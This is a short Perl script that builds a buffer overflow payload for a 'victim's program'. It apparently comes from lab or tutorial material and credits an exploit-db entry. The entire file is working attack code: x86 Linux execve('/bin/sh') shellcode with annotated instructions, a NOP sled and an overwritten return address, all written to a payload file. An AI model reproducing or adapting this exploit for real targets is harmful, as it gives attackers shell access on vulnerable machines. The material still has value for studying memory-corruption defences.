#!/usr/bin/perl

####
#  execve(/bin/sh).
#  24 bytes.
# www.exploit-db.com/exploits/13444
####


# shellcode for spawning a new shell in victim's machine
#

# NOTE: "." is a perl way to cat two strings (NOT part of shellcode)
#

my $shellcode =
"\x31\xc0".			# xorl		%eax, %eax
"\x50".				# pushl	%eax
"\x68\x6e\x2f\x73\x68".		# pushl        $0x68732f6e
"\x68\x2f\x2f\x62\x69".		# pushl	$0x69622f2f
"\x89\xe3" .			# movl         %esp, %ebx
"\x99".				# cltd
"\x52".				# pushl        %edx
"\x53".				# pushl        %ebx
"\x89\xe1".		        # movl         %esp, %ecx
"\xb0\x0b" .                    # movb         $0xb, %al
"\xcd\x80"                      # int          $0x80
;

# This address must match the buffer variable of the victim's program */
my $retaddr = "\x40\xa0\x04\x08";  #0xbffff218

# Fill NOP instruction
my $pad = "\x90" x 244;

# Input string to our victim's program
my $arg = $shellcode.$pad.$retaddr;

# Let us store the input string to a file
open OUT, "> payload";
print OUT $arg;
close OUT;
